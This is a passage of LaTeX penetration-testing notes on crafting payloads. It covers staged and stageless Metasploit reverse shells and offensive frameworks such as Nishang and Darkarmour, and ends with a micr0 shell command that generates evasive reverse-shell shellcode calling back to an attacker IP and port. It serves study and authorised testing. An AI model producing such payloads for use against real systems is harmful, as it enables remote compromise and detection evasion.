\section{Crafting payload}

\subsection{msfvenom}
\url{https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom}


See MSFVenom~\ref{tool:metasploit:msfvenom}

Staged payloads create a way to send over more components of the attack. For
example the i\verb+linux/x86/shell/reverse_tcp+ payload, when run using an
exploit module in Metasploit, will send a small stage that will be executed on
the target and then call back to the attack box to download the remainder of
the payload over the network, then executes the shellcode to establish a
reverse shell. It is important to remember that a stage also takes up space in
memory which leaves less space for the payload. What happens at each stage
could vary depending on the payload.

Stageless payloads do not have a stage. This payload will be sent in its
entirety across a network connection without a stage. This could benefit us in
environments where there is not much bandwidth and latency can interfere.
Staged payloads could lead to unstable shell sessions in these environments, so
it would be best to select a stageless payload. In addition to this, stageless
payloads can sometimes be better for evasion purposes due to less traffic
passing over the network to execute the payload, especially if we deliver it by
employing social engineering. This concept is also very well explained by Rapid
7 in this blog post on
\href{https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/}{stageless
Meterpreter payloads}.

\verb+linux/x86/shell/reverse_tcp+ is a staged payload since each / in its name represents a stage from the shell forward. 

\verb+windows/meterpreter_reverse_tcp+ is a Stageless payload since the shell
payload and network communication in the same portion of the name. If the name
of the payload doesn't appear quite clear, it will often detail if the payload
is staged or stageless in the description.

\begin{itemize}
        \item Mythic C2 Framework 	is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation.
        \item Nishang 	is a framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester.
        \item Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts.
\end{itemize}

\subsection{micr0 shell}

\href{https://github.com/senzee1984/micr0_shell}{micr0 shell} s a lightweight and efficient Python script designed for dynamically generating Windows X64 Position-Independent Code (PIC) Null-Free reverse shell shellcode. It  avoides the inclusion of \verb+0x00+ bytes. Additionally, because MSF's shellcode is widely used and therefore more likely to be flagged by signature-based detection methods, the shellcode generated by micr0shell offers an added layer of evasion capability.

\begin{verbatim}
python micr0\ shell.py --ip 10.10.16.2 -p 4444 --language csharp
\end{verbatim}

